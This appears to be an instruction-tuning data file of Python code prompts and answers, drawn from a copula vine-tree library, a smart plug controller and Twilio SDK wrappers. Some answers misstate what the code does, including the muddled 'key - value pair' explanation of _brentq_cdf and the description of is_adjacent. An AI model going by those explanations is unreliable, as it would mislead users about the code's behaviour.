{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nprepares conditional U matrix for next tree.", "response": "def prepare_next_tree(self):\n        \"\"\"Prepare conditional U matrix for next tree.\"\"\"\n        for edge in self.edges:\n            copula_theta = edge.theta\n\n            if self.level == 1:\n                left_u = self.u_matrix[:, edge.L]\n                right_u = self.u_matrix[:, edge.R]\n\n            else:\n                left_parent, right_parent = edge.parents\n                left_u, right_u = Edge.get_conditional_uni(left_parent, right_parent)\n\n            # compute conditional cdfs C(i|j) = dC(i,j)/duj and dC(i,j)/du\n            left_u = [x for x in left_u if x is not None]\n            right_u = [x for x in right_u if x is not None]\n            X_left_right = np.array([[x, y] for x, y in zip(left_u, right_u)])\n            X_right_left = np.array([[x, y] for x, y in zip(right_u, left_u)])\n\n            copula = Bivariate(edge.name)\n            copula.theta = copula_theta\n            left_given_right = copula.partial_derivative(X_left_right)\n            right_given_left = copula.partial_derivative(X_right_left)\n\n            # correction of 0 or 1\n            left_given_right[left_given_right == 0] = EPSILON\n            right_given_left[right_given_left == 0] = EPSILON\n            left_given_right[left_given_right == 1] = 1 - EPSILON\n            right_given_left[right_given_left == 1] = 1 - EPSILON\n            edge.U = np.array([left_given_right, right_given_left])"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\ncomputing likelihood of the tree given an univariate matrix.", "response": "def get_likelihood(self, uni_matrix):\n        \"\"\"Compute likelihood of the tree given an U matrix.\n\n        Args:\n            uni_matrix(numpy.array): univariate matrix to evaluate likelihood on.\n\n        Returns:\n            tuple[float, numpy.array]:\n                likelihood of the current tree, next level conditional univariate matrix\n        \"\"\"\n        uni_dim = uni_matrix.shape[1]\n        num_edge = len(self.edges)\n        values = np.zeros([1, num_edge])\n        new_uni_matrix = np.empty([uni_dim, uni_dim])\n\n        for i in range(num_edge):\n            edge = self.edges[i]\n            value, left_u, right_u = edge.get_likelihood(uni_matrix)\n            new_uni_matrix[edge.L, edge.R] = left_u\n            new_uni_matrix[edge.R, edge.L] = right_u\n            values[0, i] = np.log(value)\n\n        return np.sum(values), new_uni_matrix"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\ncreate a new instance from a dictionary.", "response": "def from_dict(cls, tree_dict, previous=None):\n        \"\"\"Create a new instance from a dictionary.\"\"\"\n        instance = cls(tree_dict['tree_type'])\n\n        fitted = tree_dict['fitted']\n        instance.fitted = fitted\n        if fitted:\n            instance.level = tree_dict['level']\n            instance.n_nodes = tree_dict['n_nodes']\n            instance.tau_matrix = np.array(tree_dict['tau_matrix'])\n            instance.previous_tree = cls._deserialize_previous_tree(tree_dict, previous)\n            instance.edges = [Edge.from_dict(edge) for edge in tree_dict['edges']]\n\n        return instance"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\ncreate a new instance from a file.", "response": "def load(cls, tree_path):\n        \"\"\"Create a new instance from a file.\"\"\"\n        with open(tree_path) as f:\n            tree_dict = json.load(f)\n\n        return cls.from_dict(tree_dict)"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef _build_first_tree(self):\n        tau_sorted = self._sort_tau_by_y(0)\n        for itr in range(self.n_nodes - 1):\n            ind = int(tau_sorted[itr, 0])\n            name, theta = Bivariate.select_copula(self.u_matrix[:, (0, ind)])\n\n            new_edge = Edge(itr, 0, ind, name, theta)\n            new_edge.tau = self.tau_matrix[0, ind]\n            self.edges.append(new_edge)", "response": "Build the first level tree."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef _build_kth_tree(self):\n        anchor = self.get_anchor()\n        aux_sorted = self._sort_tau_by_y(anchor)\n        edges = self.previous_tree.edges\n\n        for itr in range(self.n_nodes - 1):\n            right = int(aux_sorted[itr, 0])\n            left_parent, right_parent = Edge.sort_edge([edges[anchor], edges[right]])\n            new_edge = Edge.get_child_edge(itr, left_parent, right_parent)\n            new_edge.tau = aux_sorted[itr, 1]\n            self.edges.append(new_edge)", "response": "Build k - th level tree."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nfinding anchor variable with highest sum of dependence with the rest.", "response": "def get_anchor(self):\n        \"\"\"Find anchor variable with highest sum of dependence with the rest.\"\"\"\n        temp = np.empty([self.n_nodes, 2])\n        temp[:, 0] = np.arange(self.n_nodes, dtype=int)\n        temp[:, 1] = np.sum(abs(self.tau_matrix), 1)\n        anchor = int(temp[0, 0])\n        return anchor"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef _build_first_tree(self):\n        # Prim's algorithm\n        neg_tau = -1.0 * abs(self.tau_matrix)\n        X = {0}\n\n        while len(X) != self.n_nodes:\n            adj_set = set()\n            for x in X:\n                for k in range(self.n_nodes):\n                    if k not in X and k != x:\n                        adj_set.add((x, k))\n\n            # find edge with maximum\n            edge = sorted(adj_set, key=lambda e: neg_tau[e[0]][e[1]])[0]\n            name, theta = Bivariate.select_copula(self.u_matrix[:, (edge[0], edge[1])])\n\n            left, right = sorted([edge[0], edge[1]])\n            new_edge = Edge(len(X) - 1, left, right, name, theta)\n            new_edge.tau = self.tau_matrix[edge[0], edge[1]]\n            self.edges.append(new_edge)\n            X.add(edge[1])", "response": "Build the first tree with n - 1 variable."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef _build_kth_tree(self):\n        neg_tau = -1.0 * abs(self.tau_matrix)\n        edges = self.previous_tree.edges\n        visited = set([0])\n        unvisited = set(range(self.n_nodes))\n\n        while len(visited) != self.n_nodes:\n            adj_set = set()\n            for x in visited:\n                for k in range(self.n_nodes):\n                    # check if (x,k) is a valid edge in the vine\n                    if k not in visited and k != x and self._check_contraint(edges[x], edges[k]):\n                        adj_set.add((x, k))\n\n            # find edge with maximum tau\n            if len(adj_set) == 0:\n                visited.add(list(unvisited)[0])\n                continue\n\n            pairs = sorted(adj_set, key=lambda e: neg_tau[e[0]][e[1]])[0]\n            left_parent, right_parent = Edge.sort_edge([edges[pairs[0]], edges[pairs[1]]])\n\n            new_edge = Edge.get_child_edge(len(visited) - 1, left_parent, right_parent)\n            new_edge.tau = self.tau_matrix[pairs[0], pairs[1]]\n            self.edges.append(new_edge)\n\n            visited.add(pairs[1])\n            unvisited.remove(pairs[1])", "response": "Build the kth tree for level k."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef _identify_eds_ing(first, second):\n        A = set([first.L, first.R])\n        A.update(first.D)\n\n        B = set([second.L, second.R])\n        B.update(second.D)\n\n        depend_set = A & B\n        left, right = sorted(list(A ^ B))\n\n        return left, right, depend_set", "response": "Identify nodes connecting adjacent edges."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef is_adjacent(self, another_edge):\n        return (\n            self.L == another_edge.L\n            or self.L == another_edge.R\n            or self.R == another_edge.L\n            or self.R == another_edge.R\n        )", "response": "Checks if two elements of the object are adjacent."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef sort_edge(edges):\n        return sorted(edges, key=lambda x: (x.L, x.R))", "response": "Sort iterable of edges first by left and right node indices then right."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nidentifying pair univariate value from parents.", "response": "def get_conditional_uni(cls, left_parent, right_parent):\n        \"\"\"Identify pair univariate value from parents.\n\n        Args:\n            left_parent(Edge): left parent\n            right_parent(Edge): right parent\n\n        Returns:\n            tuple[np.ndarray, np.ndarray]: left and right parents univariate.\n        \"\"\"\n        left, right, _ = cls._identify_eds_ing(left_parent, right_parent)\n\n        left_u = left_parent.U[0] if left_parent.L == left else left_parent.U[1]\n        right_u = right_parent.U[0] if right_parent.L == right else right_parent.U[1]\n\n        return left_u, right_u"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef get_child_edge(cls, index, left_parent, right_parent):\n        [ed1, ed2, depend_set] = cls._identify_eds_ing(left_parent, right_parent)\n        left_u, right_u = cls.get_conditional_uni(left_parent, right_parent)\n        X = np.array([[x, y] for x, y in zip(left_u, right_u)])\n        name, theta = Bivariate.select_copula(X)\n        new_edge = Edge(index, ed1, ed2, name, theta)\n        new_edge.D = depend_set\n        new_edge.parents = [left_parent, right_parent]\n        return new_edge", "response": "Construct a child edge from two parent edges."}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\ncomputes the likelihood given a U matrix.", "response": "def get_likelihood(self, uni_matrix):\n        \"\"\"Compute likelihood given a U matrix.\n\n        Args:\n            uni_matrix(numpy.array): Matrix to compute the likelihood.\n\n        Return:\n            tuple(np.ndarray, np.ndarray, np.array): likelihood and conditional values.\n        \"\"\"\n        if self.parents is None:\n            left_u = uni_matrix[:, self.L]\n            right_u = uni_matrix[:, self.R]\n\n        else:\n            left_ing = list(self.D - self.parents[0].D)[0]\n            right_ing = list(self.D - self.parents[1].D)[0]\n            left_u = uni_matrix[self.L, left_ing]\n            right_u = uni_matrix[self.R, right_ing]\n\n        copula = Bivariate(self.name)\n        copula.theta = self.theta\n\n        X_left_right = np.array([[left_u, right_u]])\n        X_right_left = np.array([[right_u, left_u]])\n\n        value = np.sum(copula.probability_density(X_left_right))\n        left_given_right = copula.partial_derivative(X_left_right)\n        right_given_left = copula.partial_derivative(X_right_left)\n\n        return value, left_given_right, right_given_left"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nfitting Kernel density estimation to an array of datapoints X.", "response": "def fit(self, X):\n        \"\"\"Fit Kernel density estimation to an list of values.\n\n        Args:\n            X: 1-d `np.ndarray` or `pd.Series` or `list` datapoints to be estimated from.\n\n        This function will fit a gaussian_kde model to a list of datapoints\n        and store it as a class attribute.\n        \"\"\"\n\n        self.constant_value = self._get_constant_value(X)\n\n        if self.constant_value is None:\n            self.model = scipy.stats.gaussian_kde(X)\n\n        else:\n            self._replace_constant_methods()\n\n        self.fitted = True"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef probability_density(self, X):\n        self.check_fit()\n\n        if type(X) not in (int, float):\n            raise ValueError('x must be int or float')\n\n        return self.model.evaluate(X)[0]", "response": "Evaluate the estimated pdf on a point."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef cumulative_distribution(self, X, U=0):\n        self.check_fit()\n\n        low_bounds = self.model.dataset.mean() - (5 * self.model.dataset.std())\n        return self.model.integrate_box_1d(low_bounds, X) - U", "response": "Computes the integral of a 1 - D pdf between two bounds."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\ngiving a cdf value returns a value in original space.", "response": "def percent_point(self, U):\n        \"\"\"Given a cdf value, returns a value in original space.\n\n        Args:\n            U: `int` or `float` cdf value in [0,1]\n\n        Returns:\n            float: value in original space\n        \"\"\"\n        self.check_fit()\n\n        if not 0 < U < 1:\n            raise ValueError('cdf value must be in [0,1]')\n\n        return scipy.optimize.brentq(self.cumulative_distribution, -1000.0, 1000.0, args=(U))"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\ncreate a new instance of the class from a dictionary.", "response": "def from_dict(cls, copula_dict):\n        \"\"\"Set attributes with provided values.\"\"\"\n        instance = cls()\n\n        instance.fitted = copula_dict['fitted']\n        instance.constant_value = copula_dict['constant_value']\n\n        if instance.fitted and not instance.constant_value:\n            instance.model = scipy.stats.gaussian_kde([-1, 0, 0])\n\n            for key in ['dataset', 'covariance', 'inv_cov']:\n                copula_dict[key] = np.array(copula_dict[key])\n\n            attributes = ['d', 'n', 'dataset', 'covariance', 'factor', 'inv_cov']\n            for name in attributes:\n                setattr(instance.model, name, copula_dict[name])\n\n        return instance"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\ncomputes the integral of a 1 - D pdf between two bounds.", "response": "def cumulative_distribution(self, X):\n        \"\"\"Computes the integral of a 1-D pdf between two bounds\n\n        Args:\n            X(numpy.array): Shaped (1, n), containing the datapoints.\n\n        Returns:\n            numpy.array: estimated cumulative distribution.\n        \"\"\"\n        self.check_fit()\n\n        low_bounds = self.model.dataset.mean() - (5 * self.model.dataset.std())\n\n        result = []\n        for value in X:\n            result.append(self.model.integrate_box_1d(low_bounds, value))\n\n        return np.array(result)"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef _brentq_cdf(self, value):\n        # The decorator expects an instance method, but usually are decorated before being bounded\n        bound_cdf = partial(scalarize(GaussianKDE.cumulative_distribution), self)\n\n        def f(x):\n            return bound_cdf(x) - value\n\n        return f", "response": "This is a helper function to compute the percent_point of the current value of the current key - value pair. It is used to compute the percent_point of the current key - value pair."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef percent_point(self, U):\n        self.check_fit()\n\n        return scipy.optimize.brentq(self._brentq_cdf(U), -1000.0, 1000.0)", "response": "Given a cdf value returns a value in original space."}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nsets the power state of the smart power strip.", "response": "def set_power_mask(self, sid_mask, state):\n    \"\"\"Sets the power state of the smart power strip.\"\"\"\n\n    packet = bytearray(16)\n    packet[0x00] = 0x0d\n    packet[0x02] = 0xa5\n    packet[0x03] = 0xa5\n    packet[0x04] = 0x5a\n    packet[0x05] = 0x5a\n    packet[0x06] = 0xb2 + ((sid_mask<<1) if state else sid_mask)\n    packet[0x07] = 0xc0\n    packet[0x08] = 0x02\n    packet[0x0a] = 0x03\n    packet[0x0d] = sid_mask\n    packet[0x0e] = sid_mask if state else 0\n\n    response = self.send_packet(0x6a, packet)\n\n    err = response[0x22] | (response[0x23] << 8)"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef set_power(self, sid, state):\n    sid_mask = 0x01 << (sid - 1)\n    return self.set_power_mask(sid_mask, state)", "response": "Sets the power state of the smart power strip."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef check_power_raw(self):\n    packet = bytearray(16)\n    packet[0x00] = 0x0a\n    packet[0x02] = 0xa5\n    packet[0x03] = 0xa5\n    packet[0x04] = 0x5a\n    packet[0x05] = 0x5a\n    packet[0x06] = 0xae\n    packet[0x07] = 0xc0\n    packet[0x08] = 0x01\n\n    response = self.send_packet(0x6a, packet)\n    err = response[0x22] | (response[0x23] << 8)\n    if err == 0:\n      payload = self.decrypt(bytes(response[0x38:]))\n      if type(payload[0x4]) == int:\n        state = payload[0x0e]\n      else:\n        state = ord(payload[0x0e])\n      return state", "response": "Returns the power state of the smart power strip in raw format."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef check_power(self):\n    state = self.check_power_raw()\n    data = {}\n    data['s1'] = bool(state & 0x01)\n    data['s2'] = bool(state & 0x02)\n    data['s3'] = bool(state & 0x04)\n    data['s4'] = bool(state & 0x08)\n    return data", "response": "Returns the power state of the smart power strip."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef set_power(self, state):\n    packet = bytearray(16)\n    packet[0] = 2\n    if self.check_nightlight():\n      packet[4] = 3 if state else 2\n    else:\n      packet[4] = 1 if state else 0\n    self.send_packet(0x6a, packet)", "response": "Sets the power state of the smart plug."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef set_nightlight(self, state):\n    packet = bytearray(16)\n    packet[0] = 2\n    if self.check_power():\n      packet[4] = 3 if state else 1\n    else:\n      packet[4] = 2 if state else 0\n    self.send_packet(0x6a, packet)", "response": "Sets the night light state of the smart plug"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nreturning the power state of the smart plug.", "response": "def check_power(self):\n    \"\"\"Returns the power state of the smart plug.\"\"\"\n    packet = bytearray(16)\n    packet[0] = 1\n    response = self.send_packet(0x6a, packet)\n    err = response[0x22] | (response[0x23] << 8)\n    if err == 0:\n      payload = self.decrypt(bytes(response[0x38:]))\n      if type(payload[0x4]) == int:\n        if payload[0x4] == 1 or payload[0x4] == 3 or payload[0x4] == 0xFD:\n          state = True\n        else:\n          state = False\n      else:\n        if ord(payload[0x4]) == 1 or ord(payload[0x4]) == 3 or ord(payload[0x4]) == 0xFD:\n          state = True\n        else:\n          state = False\n      return state"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nstream KeyInstance records from the API as a generator.", "response": "def stream(self, limit=None, page_size=None):\n        \"\"\"\n        Streams KeyInstance records from the API as a generator stream.\n        This operation lazily loads records as efficiently as possible until the limit\n        is reached.\n        The results are returned as a generator, so this operation is memory efficient.\n\n        :param int limit: Upper limit for the number of records to return. stream()\n                          guarantees to never return more than limit.  Default is no limit\n        :param int page_size: Number of records to fetch per request, when not set will use\n                              the default value of 50 records.  If no page_size is defined\n                              but a limit is defined, stream() will attempt to read the\n                              limit with the most efficient page size, i.e. min(limit, 1000)\n\n        :returns: Generator that will yield up to limit results\n        :rtype: list[twilio.rest.api.v2010.account.key.KeyInstance]\n        \"\"\"\n        limits = self._version.read_limits(limit, page_size)\n\n        page = self.page(page_size=limits['page_size'], )\n\n        return self._version.stream(page, limits['limit'], limits['page_limit'])"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nlists the KeyInstance records from the API as a list.", "response": "def list(self, limit=None, page_size=None):\n        \"\"\"\n        Lists KeyInstance records from the API as a list.\n        Unlike stream(), this operation is eager and will load `limit` records into\n        memory before returning.\n\n        :param int limit: Upper limit for the number of records to return. list() guarantees\n                          never to return more than limit.  Default is no limit\n        :param int page_size: Number of records to fetch per request, when not set will use\n                              the default value of 50 records.  If no page_size is defined\n                              but a limit is defined, list() will attempt to read the limit\n                              with the most efficient page size, i.e. min(limit, 1000)\n\n        :returns: Generator that will yield up to limit results\n        :rtype: list[twilio.rest.api.v2010.account.key.KeyInstance]\n        \"\"\"\n        return list(self.stream(limit=limit, page_size=page_size, ))"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef get(self, sid):\n        return KeyContext(self._version, account_sid=self._solution['account_sid'], sid=sid, )", "response": "Constructs a KeyContext\n\n        :param sid: The unique string that identifies the resource\n\n        :returns: twilio.rest.api.v2010.account.key.KeyContext\n        :rtype: twilio.rest.api.v2010.account.key.KeyContext"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef get_instance(self, payload):\n        return KeyInstance(self._version, payload, account_sid=self._solution['account_sid'], )", "response": "Build an instance of KeyInstance"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef _proxy(self):\n        if self._context is None:\n            self._context = KeyContext(\n                self._version,\n                account_sid=self._solution['account_sid'],\n                sid=self._solution['sid'],\n            )\n        return self._context", "response": "Generate an instance context for the key instance"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nupdates the KeyInstance Twilio Domain", "response": "def update(self, friendly_name=values.unset):\n        \"\"\"\n        Update the KeyInstance\n\n        :param unicode friendly_name: A string to describe the resource\n\n        :returns: Updated KeyInstance\n        :rtype: twilio.rest.api.v2010.account.key.KeyInstance\n        \"\"\"\n        return self._proxy.update(friendly_name=friendly_name, )"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef update(self, friendly_name=values.unset, chat_service_sid=values.unset,\n               channel_type=values.unset, contact_identity=values.unset,\n               enabled=values.unset, integration_type=values.unset,\n               integration_flow_sid=values.unset, integration_url=values.unset,\n               integration_workspace_sid=values.unset,\n               integration_workflow_sid=values.unset,\n               integration_channel=values.unset, integration_timeout=values.unset,\n               integration_priority=values.unset,\n               integration_creation_on_message=values.unset,\n               long_lived=values.unset):\n        \"\"\"\n        Update the FlexFlowInstance\n\n        :param unicode friendly_name: Human readable description of this FlexFlow\n        :param unicode chat_service_sid: Service Sid.\n        :param FlexFlowInstance.ChannelType channel_type: Channel type\n        :param unicode contact_identity: Channel contact Identity\n        :param bool enabled: Boolean flag for enabling or disabling the FlexFlow\n        :param FlexFlowInstance.IntegrationType integration_type: Integration type\n        :param unicode integration_flow_sid: Flow Sid.\n        :param unicode integration_url: External Webhook Url\n        :param unicode integration_workspace_sid: Workspace Sid for a new task\n        :param unicode integration_workflow_sid: Workflow Sid for a new task\n        :param unicode integration_channel: Task Channel for a new task\n        :param unicode integration_timeout: Task timeout in seconds for a new task\n        :param unicode integration_priority: Task priority for a new task\n        :param bool integration_creation_on_message: Flag for task creation\n        :param bool long_lived: Long Lived flag for new Channel\n\n        :returns: Updated FlexFlowInstance\n        :rtype: twilio.rest.flex_api.v1.flex_flow.FlexFlowInstance\n        \"\"\"\n        data = values.of({\n            'FriendlyName': friendly_name,\n            'ChatServiceSid': chat_service_sid,\n            'ChannelType': channel_type,\n            'ContactIdentity': contact_identity,\n            'Enabled': enabled,\n            'IntegrationType': integration_type,\n            'Integration.FlowSid': integration_flow_sid,\n            'Integration.Url': integration_url,\n            'Integration.WorkspaceSid': integration_workspace_sid,\n            'Integration.WorkflowSid': integration_workflow_sid,\n            'Integration.Channel': integration_channel,\n            'Integration.Timeout': integration_timeout,\n            'Integration.Priority': integration_priority,\n            'Integration.CreationOnMessage': integration_creation_on_message,\n            'LongLived': long_lived,\n        })\n\n        payload = self._version.update(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return FlexFlowInstance(self._version, payload, sid=self._solution['sid'], )", "response": "Update the FlexFlowInstance s properties"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef _proxy(self):\n        if self._context is None:\n            self._context = FlexFlowContext(self._version, sid=self._solution['sid'], )\n        return self._context", "response": "Generate an instance context for the object"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef update(self, friendly_name=values.unset, chat_service_sid=values.unset,\n               channel_type=values.unset, contact_identity=values.unset,\n               enabled=values.unset, integration_type=values.unset,\n               integration_flow_sid=values.unset, integration_url=values.unset,\n               integration_workspace_sid=values.unset,\n               integration_workflow_sid=values.unset,\n               integration_channel=values.unset, integration_timeout=values.unset,\n               integration_priority=values.unset,\n               integration_creation_on_message=values.unset,\n               long_lived=values.unset):\n        \"\"\"\n        Update the FlexFlowInstance\n\n        :param unicode friendly_name: Human readable description of this FlexFlow\n        :param unicode chat_service_sid: Service Sid.\n        :param FlexFlowInstance.ChannelType channel_type: Channel type\n        :param unicode contact_identity: Channel contact Identity\n        :param bool enabled: Boolean flag for enabling or disabling the FlexFlow\n        :param FlexFlowInstance.IntegrationType integration_type: Integration type\n        :param unicode integration_flow_sid: Flow Sid.\n        :param unicode integration_url: External Webhook Url\n        :param unicode integration_workspace_sid: Workspace Sid for a new task\n        :param unicode integration_workflow_sid: Workflow Sid for a new task\n        :param unicode integration_channel: Task Channel for a new task\n        :param unicode integration_timeout: Task timeout in seconds for a new task\n        :param unicode integration_priority: Task priority for a new task\n        :param bool integration_creation_on_message: Flag for task creation\n        :param bool long_lived: Long Lived flag for new Channel\n\n        :returns: Updated FlexFlowInstance\n        :rtype: twilio.rest.flex_api.v1.flex_flow.FlexFlowInstance\n        \"\"\"\n        return self._proxy.update(\n            friendly_name=friendly_name,\n            chat_service_sid=chat_service_sid,\n            channel_type=channel_type,\n            contact_identity=contact_identity,\n            enabled=enabled,\n            integration_type=integration_type,\n            integration_flow_sid=integration_flow_sid,\n            integration_url=integration_url,\n            integration_workspace_sid=integration_workspace_sid,\n            integration_workflow_sid=integration_workflow_sid,\n            integration_channel=integration_channel,\n            integration_timeout=integration_timeout,\n            integration_priority=integration_priority,\n            integration_creation_on_message=integration_creation_on_message,\n            long_lived=long_lived,\n        )", "response": "Update the FlexFlowInstance\n\n        :param unicode friendly_name: Human readable description of this FlexFlow\n        :param unicode chat_service_sid: Service Sid.\n        :param FlexFlowInstance.ChannelType channel_type: Channel type\n        :param unicode contact_identity: Channel contact Identity\n        :param bool enabled: Boolean flag for enabling or disabling the FlexFlow\n        :param FlexFlowInstance.IntegrationType integration_type: Integration type\n        :param unicode integration_flow_sid: Flow Sid.\n        :param unicode integration_url: External Webhook Url\n        :param unicode integration_workspace_sid: Workspace Sid for a new task\n        :param unicode integration_workflow_sid: Workflow Sid for a new task\n        :param unicode integration_channel: Task Channel for a new task\n        :param unicode integration_timeout: Task timeout in seconds for a new task\n        :param unicode integration_priority: Task priority for a new task\n        :param bool integration_creation_on_message: Flag for task creation\n        :param bool long_lived: Long Lived flag for new Channel\n\n        :returns: Updated FlexFlowInstance\n        :rtype: twilio.rest.flex_api.v1.flex_flow.FlexFlowInstance"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef create(self, expiration_date=values.unset, details=values.unset,\n               hidden_details=values.unset):\n        \"\"\"\n        Create a new ChallengeInstance\n\n        :param datetime expiration_date: The future date in which this Challenge will expire\n        :param unicode details: Public details provided to contextualize the Challenge\n        :param unicode hidden_details: Hidden details provided to contextualize the Challenge\n\n        :returns: Newly created ChallengeInstance\n        :rtype: twilio.rest.authy.v1.service.entity.factor.challenge.ChallengeInstance\n        \"\"\"\n        data = values.of({\n            'ExpirationDate': serialize.iso8601_datetime(expiration_date),\n            'Details': details,\n            'HiddenDetails': hidden_details,\n        })\n\n        payload = self._version.create(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return ChallengeInstance(\n            self._version,\n            payload,\n            service_sid=self._solution['service_sid'],\n            identity=self._solution['identity'],\n            factor_sid=self._solution['factor_sid'],\n        )", "response": "Create a new ChallengeInstance"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nconstruct a ChallengeContext :param sid: A string that uniquely identifies this Challenge, or `latest`. :returns: twilio.rest.authy.v1.service.entity.factor.challenge.ChallengeContext :rtype: twilio.rest.authy.v1.service.entity.factor.challenge.ChallengeContext", "response": "def get(self, sid):\n        \"\"\"\n        Constructs a ChallengeContext\n\n        :param sid: A string that uniquely identifies this Challenge, or `latest`.\n\n        :returns: twilio.rest.authy.v1.service.entity.factor.challenge.ChallengeContext\n        :rtype: twilio.rest.authy.v1.service.entity.factor.challenge.ChallengeContext\n        \"\"\"\n        return ChallengeContext(\n            self._version,\n            service_sid=self._solution['service_sid'],\n            identity=self._solution['identity'],\n            factor_sid=self._solution['factor_sid'],\n            sid=sid,\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nbuilds an instance of ChallengeInstance", "response": "def get_instance(self, payload):\n        \"\"\"\n        Build an instance of ChallengeInstance\n\n        :param dict payload: Payload response from the API\n\n        :returns: twilio.rest.authy.v1.service.entity.factor.challenge.ChallengeInstance\n        :rtype: twilio.rest.authy.v1.service.entity.factor.challenge.ChallengeInstance\n        \"\"\"\n        return ChallengeInstance(\n            self._version,\n            payload,\n            service_sid=self._solution['service_sid'],\n            identity=self._solution['identity'],\n            factor_sid=self._solution['factor_sid'],\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nfetching a ChallengeInstance :returns: Fetched ChallengeInstance :rtype: twilio.rest.authy.v1.service.entity.factor.challenge.ChallengeInstance", "response": "def fetch(self):\n        \"\"\"\n        Fetch a ChallengeInstance\n\n        :returns: Fetched ChallengeInstance\n        :rtype: twilio.rest.authy.v1.service.entity.factor.challenge.ChallengeInstance\n        \"\"\"\n        params = values.of({})\n\n        payload = self._version.fetch(\n            'GET',\n            self._uri,\n            params=params,\n        )\n\n        return ChallengeInstance(\n            self._version,\n            payload,\n            service_sid=self._solution['service_sid'],\n            identity=self._solution['identity'],\n            factor_sid=self._solution['factor_sid'],\n            sid=self._solution['sid'],\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nupdates the ChallengeInstance :param unicode auth_payload: Optional payload to verify the Challenge :returns: Updated ChallengeInstance :rtype: twilio.rest.authy.v1.service.entity.factor.challenge.ChallengeInstance", "response": "def update(self, auth_payload=values.unset):\n        \"\"\"\n        Update the ChallengeInstance\n\n        :param unicode auth_payload: Optional payload to verify the Challenge\n\n        :returns: Updated ChallengeInstance\n        :rtype: twilio.rest.authy.v1.service.entity.factor.challenge.ChallengeInstance\n        \"\"\"\n        data = values.of({'AuthPayload': auth_payload, })\n\n        payload = self._version.update(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return ChallengeInstance(\n            self._version,\n            payload,\n            service_sid=self._solution['service_sid'],\n            identity=self._solution['identity'],\n            factor_sid=self._solution['factor_sid'],\n            sid=self._solution['sid'],\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\ngenerate an instance context for the challengeInstance", "response": "def _proxy(self):\n        \"\"\"\n        Generate an instance context for the instance, the context is capable of\n        performing various actions.  All instance actions are proxied to the context\n\n        :returns: ChallengeContext for this ChallengeInstance\n        :rtype: twilio.rest.authy.v1.service.entity.factor.challenge.ChallengeContext\n        \"\"\"\n        if self._context is None:\n            self._context = ChallengeContext(\n                self._version,\n                service_sid=self._solution['service_sid'],\n                identity=self._solution['identity'],\n                factor_sid=self._solution['factor_sid'],\n                sid=self._solution['sid'],\n            )\n        return self._context"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef update(self, auth_payload=values.unset):\n        return self._proxy.update(auth_payload=auth_payload, )", "response": "Update the ChallengeInstance\n\n        :param unicode auth_payload: Optional payload to verify the Challenge\n\n        :returns: Updated ChallengeInstance\n        :rtype: twilio.rest.authy.v1.service.entity.factor.challenge.ChallengeInstance"}
